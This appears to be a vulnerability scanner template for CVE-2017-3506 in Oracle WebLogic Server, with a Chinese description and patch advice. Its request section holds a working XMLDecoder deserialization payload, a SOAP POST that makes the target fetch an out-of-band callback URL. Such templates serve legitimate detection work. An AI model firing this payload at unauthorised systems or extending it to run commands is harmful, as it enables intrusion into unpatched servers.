id: CVE-2017-3506
info:
  name: Oracle Fusion Middleware Weblogic Server - Remote OS Command Execution
  author:
  - pdteam
  description: |-
    Oracle WebLogic Server XMLDecoder 反序列化漏洞
    Oracle Fusion Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。Oracle WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。

    Oracle Fusion Middleware中的Oracle WebLogic Server组件的Web Services子组件存在安全漏洞。攻击者可利用该漏洞未授权访问、创建、删除或更改数据，影响数据的保密性和完整性。以下版本受到影响：Oracle WebLogic Server 10.3.6.0版本，12.1.3.0版本，12.2.1.0版本，12.2.1.1版本，12.2.1.2版本。
  severity: high
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html

    临时修复方案：
    1、不要把用户的输入或者是用户可控的参数直接放进反序列化的操作中去。
    2、在进入反序列化函数之前,对参数进行限制过滤。
    3、给反序列数据加密签名，并确保解密在反序列之前
    4、给反序列化接口添加认证授权
requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  raw:
  - |
    POST /wls-wsat/RegistrationRequesterPortType HTTP/1.1
    Host: {{Hostname}}
    Content-Type: text/xml
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,
    Content-Type: text/xml;charset=UTF-8

    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java version="1.8" class="java.beans.XMLDecoder">
            <void id="url" class="java.net.URL">
              <string>http://{{interactsh-url}}</string>
            </void>
            <void idref="url">
              <void id="stream" method ="openStream"/>
            </void>
          </java>
        </work:WorkContext>
        </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
